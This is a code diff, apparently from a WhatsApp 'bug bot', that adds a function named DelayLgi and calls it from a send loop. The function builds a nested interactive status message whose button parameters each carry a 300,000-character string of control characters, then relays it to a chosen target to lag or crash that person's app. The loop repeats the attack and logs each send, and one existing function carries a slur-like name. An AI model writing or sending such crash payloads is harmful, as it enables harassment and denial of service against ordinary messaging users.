@@ -1542,6 +1542,33 @@ async function emmalocalautism(sock, target) {
   });
 }
 
+async function DelayLgi(sock, target) {
+    const j = (n) => '{"k":"' + n.repeat(300000) + '"}';
+    const msg = {
+        groupStatusMessageV2: {
+            message: {
+                viewOnceMessage: {
+                    message: {
+                        interactiveMessage: {
+                            body: { text: "@heysaka" },
+                            nativeFlowMessage: {
+                                buttons: [
+                                    { name: "KINTANA EXCLUSIVE", buttonParamsJson: j("\u0000") },
+                                    { name: "KINTANA EXCLUSIVE", buttonParamsJson: j("\u0001") },
+                                    { name: "KINTANA EXCLUSIVE", buttonParamsJson: j("\u0002") }
+                                ],
+                                messageVersion: 1
+                            }
+                        }
+                    }
+                }
+            },
+            participant: target
+        }
+    };
+    await sock.relayMessage(target, msg, { noSelfSync: false });
+}
+
 async function halonyet(sock, target) {
     const msg = {
         groupStatusMessageV2: {
@@ -1781,9 +1808,10 @@ async function bug1(sock, target) {
 }
 
 async function bug2(sock, target) {
-  for (let i = 0; i < 10; i++) {
+  for (let i = 0; i < 5; i++) {
     try {
       await emmalocalautism(sock, target);
+      await DelayLgi(sock, target);
       console.log(`bug send to ${target}`);
     } catch (innerError) {
       console.error(`error:`, innerError);
